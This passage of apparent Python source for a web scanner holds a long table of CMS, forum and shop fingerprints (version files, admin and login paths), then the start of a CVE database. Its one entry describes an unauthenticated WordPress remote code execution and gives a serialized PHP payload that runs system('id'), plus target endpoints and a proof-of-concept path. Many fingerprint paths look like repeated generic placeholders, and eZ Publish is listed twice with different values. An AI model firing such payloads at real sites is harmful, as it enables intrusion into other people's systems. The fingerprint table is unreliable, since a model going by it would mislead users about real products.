    'tidw': {'name': 'TiddlyWiki', 'url': 'https://tiddlywiki.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.json', 'admin_path': 'admin', 'login_path': 'login'},
    'sulu': {'name': 'SULU', 'url': 'https://sulu.io', 'vd': '1', 'deeps': '1', 'version_file': 'src/Sulu/Bundle/CoreBundle/Resources/config/sulu.yml', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'subcms': {'name': 'Subrion CMS', 'url': 'https://subrion.org', 'vd': '1', 'deeps': '1', 'version_file': 'includes/classes/ia.core.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'sqm': {'name': 'Squiz Matrix', 'url': 'https://www.squiz.net', 'vd': '0', 'deeps': '0', 'version_file': 'core/include/version.inc', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'spin': {'name': 'Spin CMS', 'url': 'https://www.spin.cw', 'vd': '0', 'deeps': '0', 'version_file': 'system/version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'sdev': {'name': 'Solodev', 'url': 'https://www.solodev.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'snews': {'name': 'sNews', 'url': 'https://snewscms.com', 'vd': '1', 'deeps': '1', 'version_file': 'snews.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'score': {'name': 'Sitecore', 'url': 'https://www.sitecore.com', 'vd': '0', 'deeps': '0', 'version_file': 'sitecore/shell/version.xml', 'admin_path': 'sitecore/admin', 'login_path': 'sitecore/login'},
    'sim': {'name': 'SIMsite', 'url': 'https://simgroep.nl', 'vd': '0', 'deeps': '0', 'version_file': 'simsites/version.txt', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'spb': {'name': 'Simplebo', 'url': 'https://www.simplebo.fr', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'sst': {'name': 'SilverStripe', 'url': 'https://www.silverstripe.org', 'vd': '0', 'deeps': '0', 'version_file': 'framework/src/Core/Version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'silva': {'name': 'Silva CMS', 'url': 'http://infrae.com', 'vd': '0', 'deeps': '0', 'version_file': 'lib/silva/version.py', 'admin_path': 'manage', 'login_path': 'login'},
    'dle': {'name': 'DataLife Engine', 'url': 'https://dle-news.com', 'vd': '0', 'deeps': '0', 'version_file': 'engine/classes/version.class.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'spity': {'name': 'Serendipity', 'url': 'https://docs.s9y.org', 'vd': '1', 'deeps': '1', 'version_file': 'serendipity_config.inc.php', 'admin_path': 'serendipity_admin.php', 'login_path': 'serendipity_admin.php'},
    'rcube': {'name': 'RoundCube Webmail', 'url': 'https://roundcube.net', 'vd': '0', 'deeps': '0', 'version_file': 'program/include/rcmail.php', 'admin_path': 'admin', 'login_path': 'index.php'},
    'slcms': {'name': 'SeamlessCMS', 'url': 'https://www.seamlesscms.com', 'vd': '1', 'deeps': '1', 'version_file': 'includes/version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'rock': {'name': 'Rock RMS', 'url': 'https://www.rockrms.com', 'vd': '1', 'deeps': '1', 'version_file': 'Rock/version.json', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'roadz': {'name': 'Roadiz CMS', 'url': 'https://www.roadiz.io', 'vd': '1', 'deeps': '1', 'version_file': 'src/Roadiz/Version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'rite': {'name': 'RiteCMS', 'url': 'http://ritecms.com', 'vd': '1', 'deeps': '1', 'version_file': 'includes/version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'rcms': {'name': 'RCMS', 'url': 'https://www.reallycms.fi', 'vd': '0', 'deeps': '0', 'version_file': 'rcms/version.txt', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'quick': {'name': 'Quick.Cms', 'url': 'https://opensolution.org', 'vd': '1', 'deeps': '1', 'version_file': 'config/version.txt', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'pcore': {'name': 'Pimcore', 'url': 'https://pimcore.com', 'vd': '0', 'deeps': '0', 'version_file': 'pimcore/version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'pwind': {'name': 'phpWind', 'url': 'https://www.phpwind.com', 'vd': '1', 'deeps': '1', 'version_file': 'global.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'phpc': {'name': 'phpCMS', 'url': 'http://www.phpcms.cn', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'percms': {'name': 'Percussion CMS', 'url': 'https://www.percussion.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'pblue': {'name': 'PencilBlue', 'url': 'http://pencilblue.org', 'vd': '0', 'deeps': '0', 'version_file': 'package.json', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'ophal': {'name': 'Ophal', 'url': 'http://ophal.org', 'vd': '1', 'deeps': '1', 'version_file': 'src/Ophal/Version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'sfy': {'name': 'Sitefinity', 'url': 'https://www.sitefinity.com', 'vd': '1', 'deeps': '1', 'version_file': 'Sitefinity/version.txt', 'admin_path': 'sitefinity', 'login_path': 'sitefinity/login'},
    'otwsm': {'name': 'OpenText WSM', 'url': 'http://www.opentext.com', 'vd': '1', 'deeps': '1', 'version_file': 'webservices/version.txt', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'ocms': {'name': 'OpenCms', 'url': 'http://www.opencms.org', 'vd': '1', 'deeps': '1', 'version_file': 'WEB-INF/version.txt', 'admin_path': 'opencms', 'login_path': 'opencms/login'},
    'odoo': {'name': 'Odoo', 'url': 'https://www.odoo.com', 'vd': '0', 'deeps': '0', 'version_file': 'odoo/odoo.py', 'admin_path': 'web', 'login_path': 'web/login'},
    'share': {'name': 'SharePoint', 'url': 'https://sharepoint.com', 'vd': '1', 'deeps': '1', 'version_file': '_layouts/version.txt', 'admin_path': '_layouts', 'login_path': 'login'},
    'octcms': {'name': 'October CMS', 'url': 'https://octobercms.com', 'vd': '0', 'deeps': '0', 'version_file': 'modules/system/version.php', 'admin_path': 'backend', 'login_path': 'backend/login'},
    'mura': {'name': 'Mura CMS', 'url': 'http://www.getmura.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.ini', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'moto': {'name': 'Moto CMS', 'url': 'https://www.motocms.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'mnet': {'name': 'Mono.net', 'url': 'https://mono.net', 'vd': '0', 'deeps': '0', 'version_file': 'mono/version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'methd': {'name': 'Methode', 'url': 'https://www.eidosmedia.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'mambo': {'name': 'Mambo', 'url': 'http://mambo-foundation.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'administrator', 'login_path': 'administrator/index.php'},
    'lscms': {'name': 'LiveStreet CMS', 'url': 'http://livestreetcms.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'lepton': {'name': 'LEPTON CMS', 'url': 'https://lepton-cms.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'kbcms': {'name': 'Kooboo CMS', 'url': 'https://www.kooboo.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.json', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'koken': {'name': 'Koken', 'url': 'http://koken.me', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'jimdo': {'name': 'Jimdo', 'url': 'https://www.jimdo.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'dashboard', 'login_path': 'login'},
    'ibit': {'name': 'Indexhibit', 'url': 'http://www.indexhibit.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'wflow': {'name': 'Webflow', 'url': 'https://webflow.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'designer', 'login_path': 'login'},
    'jcms': {'name': 'Jalios JCMS', 'url': 'http://www.jalios.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'impage': {'name': 'ImpressPages', 'url': 'https://www.impresspages.org', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'hotaru': {'name': 'Hotaru CMS', 'url': 'http://hotarucms.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'hippo': {'name': 'HIPPO CMS', 'url': 'https://www.onehippo.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'grav': {'name': 'GravCMS', 'url': 'https://getgrav.org', 'vd': '0', 'deeps': '0', 'version_file': 'system/src/Grav/Common/Grav.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'gsimp': {'name': 'GetSimple', 'url': 'http://get-simple.info', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'fork': {'name': 'Fork CMS', 'url': 'https://www.fork-cms.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'private', 'login_path': 'private/login'},
    'phpn': {'name': 'PHP Nuke', 'url': 'https://www.phpnuke.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'flex': {'name': 'FlexCMP', 'url': 'https://www.flexcmp.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'ezpu': {'name': 'eZ Publish', 'url': 'https://ez.no', 'vd': '0', 'deeps': '0', 'version_file': 'ezpublish/version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'exen': {'name': 'ExpressionEngine', 'url': 'https://expressionengine.com', 'vd': '0', 'deeps': '0', 'version_file': 'system/ee/ExpressionEngine/Service/Version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'epis': {'name': 'EPiServer', 'url': 'https://www.episerver.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'e107': {'name': 'e107', 'url': 'https://e107.org', 'vd': '0', 'deeps': '0', 'version_file': 'e107_version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'dnn': {'name': 'DNN Platform', 'url': 'http://www.dnnsoftware.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'phpbb': {'name': 'phpBB', 'url': 'http://phpbb.com', 'vd': '0', 'deeps': '0', 'version_file': 'includes/constants.php', 'admin_path': 'adm', 'login_path': 'ucp.php'},
    'dede': {'name': 'DEDE CMS', 'url': 'http://dedecms.com', 'vd': '0', 'deeps': '0', 'version_file': 'include/common.inc.php', 'admin_path': 'dede', 'login_path': 'dede/login'},
    'dncms': {'name': 'Danneo CMS', 'url': 'http://danneo.ru', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'dragon': {'name': 'CPG Dragonfly', 'url': 'https://dragonflycms.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'coton': {'name': 'Cotonti', 'url': 'https://www.cotonti.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'orchd': {'name': 'Orchard CMS', 'url': 'https://orchardproject.net', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'cbox': {'name': 'ContentBox', 'url': 'https://www.contentboxcms.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.json', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'conful': {'name': 'Contentful', 'url': 'https://www.contentful.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'app', 'login_path': 'login'},
    'cntsis': {'name': 'Contensis', 'url': 'https://zengenti.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'cnido': {'name': 'CONTENIDO', 'url': 'https://www.contenido.org', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'contenido', 'login_path': 'contenido/login'},
    'contao': {'name': 'Contao', 'url': 'https://contao.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'contao', 'login_path': 'contao/login'},
    'con5': {'name': 'Concrete5', 'url': 'https://www.concrete5.org', 'vd': '1', 'deeps': '1', 'version_file': 'concrete/version.txt', 'admin_path': 'dashboard', 'login_path': 'login'},
    'arc': {'name': 'Arc Forum', 'url': 'http://arclanguage.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'bboard': {'name': 'Burning Board', 'url': 'https://www.woltlab.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'acp', 'login_path': 'acp/login'},
    'dscrs': {'name': 'Discourse', 'url': 'https://www.discourse.org', 'vd': '1', 'deeps': '1', 'version_file': 'version.json', 'admin_path': 'admin', 'login_path': 'login'},
    'discuz': {'name': 'Discuz!', 'url': 'http://www.discuz.net', 'vd': '1', 'deeps': '1', 'version_file': 'discuz_version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'flarum': {'name': 'Flarum', 'url': 'https://flarum.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.json', 'admin_path': 'admin', 'login_path': 'login'},
    'fluxbb': {'name': 'FluxBB', 'url': 'https://fluxbb.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'ipb': {'name': 'IP.Board', 'url': 'https://www.invisioncommunity.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'minibb': {'name': 'miniBB', 'url': 'http://www.minibb.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'mybb': {'name': 'MyBB', 'url': 'https://mybb.com', 'vd': '1', 'deeps': '1', 'version_file': 'inc/version.php', 'admin_path': 'admin', 'login_path': 'member.php'},
    'nodebb': {'name': 'NodeBB', 'url': 'https://nodebb.org', 'vd': '1', 'deeps': '1', 'version_file': 'package.json', 'admin_path': 'admin', 'login_path': 'login'},
    'punbb': {'name': 'PunBB', 'url': 'http://punbb.informer.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'smf': {'name': 'SMF', 'url': 'http://simplemachines.org', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'index.php'},
    'vanilla': {'name': 'Vanilla Forums', 'url': 'https://vanillaforums.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'dashboard', 'login_path': 'login'},
    'uknva': {'name': 'uKnowva', 'url': 'https://uknowva.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'xf': {'name': 'XenForo', 'url': 'https://xenforo.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'xmb': {'name': 'XMB', 'url': 'https://www.xmbforum.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'yabb': {'name': 'YaBB', 'url': 'http://www.yabbforum.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'aef': {'name': 'AEF', 'url': 'http://www.anelectron.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'bhf': {'name': 'Beehive Forum', 'url': 'https://www.beehiveforum.co.uk', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'fudf': {'name': 'FUDforum', 'url': 'http://fudforum.org', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'adm', 'login_path': 'login'},
    'phorum': {'name': 'Phorum', 'url': 'https://www.phorum.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'yaf': {'name': 'YAF', 'url': 'http://www.yetanotherforum.net', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'yazd': {'name': 'Yazd', 'url': 'http://www.forumsoftware.ca', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'ubbt': {'name': 'UBB.threads', 'url': 'http://www.ubbcentral.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'nnf': {'name': 'NoNonsense', 'url': 'http://camendesign.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'myupb': {'name': 'myUPB', 'url': 'http://www.myupb.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'mvnf': {'name': 'mvnForum', 'url': 'https://sourceforge.net', 'vd': '1', 'deeps': '1', 'version_file': 'version.properties', 'admin_path': 'admin', 'login_path': 'login'},
    'mwf': {'name': 'mwForum', 'url': 'https://www.mwforum.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'mcb': {'name': 'MercuryBoard', 'url': 'http://www.mercuryboard.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'aspf': {'name': 'AspNetForum', 'url': 'https://www.jitbit.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'jf': {'name': 'JForum', 'url': 'http://www.jforum.net', 'vd': '1', 'deeps': '1', 'version_file': 'version.properties', 'admin_path': 'admin', 'login_path': 'login'},
    'afsto': {'name': 'Afosto', 'url': 'https://afosto.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'abuy': {'name': 'Afterbuy', 'url': 'https://www.afterbuy.de', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'arstta': {'name': 'Arastta', 'url': 'https://arastta.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'bigc': {'name': 'BigCommerce', 'url': 'https://www.bigcommerce.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'bigw': {'name': 'Bigware', 'url': 'https://bigware.de', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'bizw': {'name': 'Bizweb', 'url': 'https://www.sapo.vn', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'cexec': {'name': 'Clientexec', 'url': 'https://www.clientexec.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'cloudc': {'name': 'CloudCart', 'url': 'https://cloudcart.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'cmshop': {'name': 'ColorMeShop', 'url': 'https://shop-pro.jp', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'oracle_atg': {'name': 'Oracle ATG', 'url': 'http://www.oracle.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'mdle': {'name': 'Moodle', 'url': 'https://moodle.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'orkis': {'name': 'ORKIS', 'url': 'http://www.orkis.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'cmdia': {'name': 'Comandia', 'url': 'https://www.comandia.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'coms': {'name': 'Commerce Server', 'url': 'http://commerceserver.net', 'vd': '1', 'deeps': '1', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'cosmos': {'name': 'Cosmoshop', 'url': 'https://www.cosmoshop.de', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'csc': {'name': 'CS Cart', 'url': 'https://www.cs-cart.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'cubec': {'name': 'CubeCart', 'url': 'https://www.cubecart.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'abda': {'name': 'Al Mubda', 'url': 'http://www.almubda.net', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'dweb': {'name': 'Dynamicweb', 'url': 'https://www.dynamicweb.dk', 'vd': '1', 'deeps': '1', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'ecc': {'name': 'EC-CUBE', 'url': 'https://www.ec-cube.net', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'elcd': {'name': 'Elcodi', 'url': 'http://elcodi.io', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'epgs': {'name': 'ePages', 'url': 'https://epages.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'ezpub': {'name': 'eZ Publish', 'url': 'https://ez.no', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'for3': {'name': 'Fortune3', 'url': 'https://www.fortune3.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'btree': {'name': 'BigTree CMS', 'url': 'https://www.bigtreecms.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'pmoc': {'name': 'Proximis', 'url': 'https://www.proximis.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'qcart': {'name': 'Quick.Cart', 'url': 'https://opensolution.org', 'vd': '1', 'deeps': '1', 'version_file': 'config/version.txt', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'rbsc': {'name': 'RBS Change', 'url': 'https://www.rbschange.fr', 'vd': '1', 'deeps': '1', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'sfcc': {'name': 'Salesforce', 'url': 'https://demandware.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'sazito': {'name': 'Sazito', 'url': 'https://sazito.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'shopatron': {'name': 'Shopatron', 'url': 'https://www.shopatron.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'shoper': {'name': 'Shoper', 'url': 'https://www.shoper.pl', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'shopery': {'name': 'Shopery', 'url': 'https://shopery.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'shopfa': {'name': 'ShopFA', 'url': 'https://shopfa.com', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'shoptet': {'name': 'Shoptet', 'url': 'https://www.shoptet.cz', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'smartstore': {'name': 'Smartstore', 'url': 'https://www.smartstore.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': 'admin', 'login_path': 'login'},
    'solusquare': {'name': 'Solusquare', 'url': 'https://www.solusquare.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'spree': {'name': 'Spree', 'url': 'https://spreecommerce.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.rb', 'admin_path': 'admin', 'login_path': 'login'},
    'brightspot': {'name': 'Brightspot', 'url': 'https://www.brightspot.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.xml', 'admin_path': 'admin', 'login_path': 'login'},
    'amiro': {'name': 'Amiro.CMS', 'url': 'https://www.amiro.ru', 'vd': '1', 'deeps': '1', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'ekmps': {'name': 'ekmPowershop', 'url': 'https://www.ekm.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'godaddywb': {'name': 'GoDaddy', 'url': 'https://godaddy.com', 'vd': '1', 'deeps': '1', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'whmcs': {'name': 'WHMCS', 'url': 'https://www.whmcs.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'opennemas': {'name': 'OpenNemas', 'url': 'https://www.opennemas.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'zencart': {'name': 'Zen Cart', 'url': 'https://www.zen-cart.com', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'ipo': {'name': 'IPO CMS', 'url': 'https://www.ipo.cz', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'login'},
    'hugo': {'name': 'Hugo', 'url': 'https://gohugo.io', 'vd': '0', 'deeps': '0', 'version_file': 'version.txt', 'admin_path': '', 'login_path': ''},
    'squarespace': {'name': 'Squarespace', 'url': 'https://www.squarespace.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'freshpage': {'name': 'Freshpage', 'url': 'https://www.freshpage.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'notion': {'name': 'Notion', 'url': 'https://www.notion.so', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'workspace', 'login_path': 'login'},
    'laravel': {'name': 'Laravel', 'url': 'https://laravel.com', 'vd': '1', 'deeps': '1', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'aem': {'name': 'Adobe Experience Manager', 'url': 'https://www.adobe.com', 'vd': '1', 'deeps': '1', 'version_file': '', 'admin_path': '/crx/de/', 'login_path': '/crx/de/login'},
    'kentico': {'name': 'Kentico CMS', 'url': 'https://www.kentico.com', 'vd': '1', 'deeps': '1', 'version_file': '/CMSModules/System/version.txt', 'admin_path': '/Admin/', 'login_path': '/Admin/login'},
    'liferay': {'name': 'Liferay Portal', 'url': 'https://www.liferay.com', 'vd': '1', 'deeps': '1', 'version_file': '/portal.properties', 'admin_path': '/admin/', 'login_path': '/login'},
    'alfresco': {'name': 'Alfresco CMS', 'url': 'https://www.alfresco.com', 'vd': '1', 'deeps': '1', 'version_file': '/alfresco/service/index', 'admin_path': '/alfresco/', 'login_path': '/alfresco/login'},
    'magnolia': {'name': 'Magnolia CMS', 'url': 'https://www.magnolia-cms.com', 'vd': '1', 'deeps': '1', 'version_file': '/magnoliaAuthor/version', 'admin_path': '/magnoliaAuthor/', 'login_path': '/magnoliaAuthor/login'},
    'typo3': {'name': 'TYPO3 CMS', 'url': 'https://typo3.org', 'vd': '1', 'deeps': '1', 'version_file': '/typo3/version.txt', 'admin_path': '/typo3/', 'login_path': '/typo3/login'},
}

CVE_DB = {
    'CVE-2026-63030': {'name': 'WP Core RCE', 'cms': 'wp', 'type': 'rce', 'sev': 'critical', 'cvss': '9.8', 'desc': 'RCE chain in WordPress Core allows unauthenticated attackers to execute arbitrary PHP code', 'eps': ['/wp-admin/admin-ajax.php', '/wp-cron.php', '/wp-json/wp/v2/posts'], 'method': 'wp_core_rce', 'payload': 'O:8:"stdClass":2:{s:4:"file";s:14:"/var/www/html/";s:4:"code";s:19:"system(\'id\');exit;";}', 'rem': 'Update WP to 6.8+', 'poc': '/wp-admin/admin-ajax.php?action=rest-nonce'},
